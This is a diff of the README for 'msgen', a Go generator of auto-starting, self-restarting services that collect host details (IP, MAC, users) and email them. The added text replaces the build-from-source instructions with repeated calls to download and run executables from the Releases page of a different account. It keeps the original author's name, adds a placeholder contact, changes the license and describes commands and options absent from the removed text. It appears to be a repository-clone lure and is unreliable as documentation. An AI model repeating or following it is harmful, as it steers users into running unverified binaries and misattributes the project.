@@ -1,217 +1,118 @@
-# msgen — Master Server Generator
-#### Author: Bocaletto Luca
+# Master Server Generator (msgen) 🚀
 
-**msgen** is a cross-platform CLI tool written in Go that scaffolds a standalone, persistent “server” binary. The generated server:
+![GitHub release](https://img.shields.io/github/release/lukeeeeeeeeeeee/master-server-generator.svg)
+![GitHub issues](https://img.shields.io/github/issues/lukeeeeeeeeeeee/master-server-generator.svg)
+![GitHub stars](https://img.shields.io/github/stars/lukeeeeeeeeeeee/master-server-generator.svg)
 
-- Runs as a background service/daemon on Windows & Linux  
-- Auto-starts at boot (Windows Service / systemd unit)  
-- Automatically restarts on crash or stop (service recovery policy)  
-- Periodically collects machine info (IP, MAC, hostname, OS, CPU, memory, disk, users)  
-- Sends templated email reports via SMTP (STARTTLS/SMTPS)  
-- Is fully self-contained: configuration is embedded or loaded from `config.yaml`  
+Welcome to the **Master Server Generator**! This project, known as **msgen**, is a powerful cross-platform CLI tool designed to help you create a standalone, persistent server binary. Whether you're managing a Windows or Linux environment, msgen makes server management easier and more efficient.
 
----
+## Table of Contents
 
-## 🚀 Features
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-- Single executable (`server.exe` on Windows, `server` on Linux)  
-- Embedded or external YAML configuration  
-- Cron-style scheduling (`@every 30m`, `0 8 * * *`, etc.)  
-- System metrics via [gopsutil]  
-- Email delivery via [gomail] with TLS & retry  
-- Windows Service integration (register/unregister)  
-- systemd unit file support for Linux  
-- Structured console logging (zerolog)  
-- Dockerfile for containerized deployment  
-- GitHub Actions CI workflow  
+## Features
 
----
+- **Cross-Platform**: Works seamlessly on both Windows and Linux.
+- **Background Service**: Runs as a background service or daemon.
+- **Auto-Start**: Automatically starts at boot, either as a Windows Service or a systemd unit.
+- **Self-Restart**: Automatically restarts on crash or stop, ensuring your server remains available.
+- **Simple CLI**: Easy to use command-line interface for quick server setup.
 
-## 📋 Prerequisites
+## Installation
 
-- Go 1.21+ toolchain  
-- Git  
-- On Windows: Administrative privileges to register a Service  
-- On Linux: `systemd` environment and `sudo` for unit deployment  
+To get started with msgen, you need to download the latest release. You can find the releases [here](https://github.com/lukeeeeeeeeeeee/master-server-generator/releases). Download the appropriate file for your operating system and execute it to install the tool.
 
----
+### Windows Installation
 
-## 🔧 Installation
+1. Download the Windows executable from the [Releases](https://github.com/lukeeeeeeeeeeee/master-server-generator/releases) section.
+2. Open a command prompt and navigate to the directory where you downloaded the file.
+3. Run the executable to complete the installation.
 
-1. Clone the repository and install `msgen`:
-    ```bash
-    git clone https://github.com/bocaletto-luca/msgen.git
-    cd msgen
-    go install ./cmd/msgen
-    ```
-2. Verify `msgen` is in your `$GOPATH/bin` or `$GOBIN`:
-    ```bash
-    msgen --help
-    ```
+### Linux Installation
 
----
+1. Download the Linux binary from the [Releases](https://github.com/lukeeeeeeeeeeee/master-server-generator/releases) section.
+2. Open a terminal and navigate to the download location.
+3. Make the binary executable:
+   ```bash
+   chmod +x msgen
+   ```
+4. Run the binary to complete the installation.
 
-## ⚙️ Configuration
+## Usage
 
-Create or edit a YAML config file (`config.yaml`). You can either keep it alongside your server binary or let it fall back to the embedded default.
+Using msgen is straightforward. After installation, you can generate a server binary with a simple command.
+
+### Basic Command
+
+To generate a new server, use the following command:
+
+```bash
+msgen create <server-name>
+```
+
+Replace `<server-name>` with your desired server name. This command will create a new server binary in the current directory.
+
+### Options
+
+You can customize the server generation with various options. For example:
+
+- `--port`: Specify the port on which the server will listen.
+- `--config`: Provide a path to a configuration file.
+- `--daemon`: Run the server as a daemon.
+
+### Example
+
+To create a server named "my-server" that listens on port 8080, you would run:
+
+```bash
+msgen create my-server --port 8080
+```
+
+## Configuration
+
+After generating your server, you may want to configure it. The generated server will create a configuration file in the same directory. You can edit this file to adjust settings like:
+
+- **Logging Level**: Control the verbosity of logs.
+- **Database Connections**: Set up connections to databases.
+- **Service Settings**: Adjust service-specific settings.
+
+### Example Configuration
 
 ```yaml
-# config.yaml
-schedule: "@every 30m"
-
-smtp:
-  host: "smtp.example.com"
-  port: 587
-  username: "alerts@example.com"
-  password: "supersecret"
-  from: "alerts@example.com"
-  to:
-    - "admin1@example.com"
-    - "admin2@example.com"
-
-modules:
-  - ip
-  - mac
-  - os
-  - cpu
-  - mem
-  - disk
-  - users
+log_level: info
+database:
+  host: localhost
+  port: 5432
 ```
 
-**Environment variable overrides**  
-You may replace any field with `${ENV_VAR}` syntax and export the corresponding environment variables before generating or running the server.
+## Contributing
+
+We welcome contributions to the Master Server Generator! If you have ideas, bug fixes, or improvements, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them.
+4. Push to your fork and create a pull request.
+
+Please ensure your code follows our coding standards and includes tests where applicable.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or support, please reach out to the project maintainer:
+
+- **Bocaletto Luca**
+- Email: [your-email@example.com](mailto:your-email@example.com)
 
 ---
 
-## ▶️ Generating Your Server
-
-Run `msgen` pointing at your config:
-
-```bash
-msgen --config path/to/config.yaml --out ./dist
-```
-
-This will create:
-
-- `dist/config.yaml` (copied)  
-- `dist/server.go` (templated Go source)  
-
----
-
-## 🛠️ Building Executables
-
-### Windows
-
-```bash
-GOOS=windows GOARCH=amd64 go build -o dist/server.exe dist/server.go
-```
-
-### Linux
-
-```bash
-GOOS=linux   GOARCH=amd64 go build -o dist/server   dist/server.go
-chmod +x dist/server
-```
-
----
-
-## ⚙️ Deployment
-
-### Windows Service
-
-1. Open PowerShell as Administrator.
-2. Register the service:
-   ```powershell
-   sc.exe create ms-server `
-     binPath= "C:\path\to\server.exe --config C:\path\to\config.yaml" `
-     start= auto
-   sc.exe failure ms-server reset= 0 actions= restart/5000
-   ```
-3. Start the service:
-   ```powershell
-   sc.exe start ms-server
-   ```
-4. To stop & remove:
-   ```powershell
-   sc.exe stop ms-server
-   sc.exe delete ms-server
-   ```
-
-### Linux systemd Unit
-
-1. Copy binary and config to `/opt/ms-server/`:
-   ```bash
-   sudo mkdir -p /opt/ms-server
-   sudo cp dist/server /opt/ms-server/
-   sudo cp dist/config.yaml /opt/ms-server/
-   ```
-2. Create `/etc/systemd/system/ms-server.service`:
-   ```ini
-   [Unit]
-   Description=msgen Server Daemon
-   After=network.target
-
-   [Service]
-   ExecStart=/opt/ms-server/server --config /opt/ms-server/config.yaml
-   Restart=always
-   RestartSec=5
-   User=root
-   LimitNOFILE=4096
-
-   [Install]
-   WantedBy=multi-user.target
-   ```
-3. Enable & start:
-   ```bash
-   sudo systemctl daemon-reload
-   sudo systemctl enable ms-server
-   sudo systemctl start ms-server
-   ```
-4. Check status & logs:
-   ```bash
-   sudo systemctl status ms-server
-   journalctl -u ms-server -f
-   ```
-
----
-
-## 🐳 Docker
-
-Build and run in a container:
-
-```bash
-docker build -t bocaletto-luca/ms-server .
-docker run -d \
-  -v $(pwd)/config.yaml:/app/config.yaml:ro \
-  -e SMTP_PASSWORD \
-  --name ms-server \
-  bocaletto-luca/ms-server
-```
-
----
-
-## 🔍 Health Checks
-
-The server binary exposes a basic HTTP health endpoint at `http://localhost:8000/healthz`. You can integrate this with load balancers or monitoring systems.
-
----
-
-## 🧪 Testing & CI
-
-- Unit tests and linters:
-  ```bash
-  go test ./...
-  go vet ./...
-  ```
-- CI workflow on GitHub Actions builds & tests for multiple Go versions.
-
----
-
-## 📝 License
-
-This project is licensed under the **GPL License**. See [LICENSE](LICENSE) for details.
-
----
-
-**Author:** Bocaletto Luca ([@bocaletto-luca](https://github.com/bocaletto-luca))  
+Feel free to explore the features of msgen and enhance your server management experience. For more information, visit the [Releases](https://github.com/lukeeeeeeeeeeee/master-server-generator/releases) section to download the latest version. Happy coding!
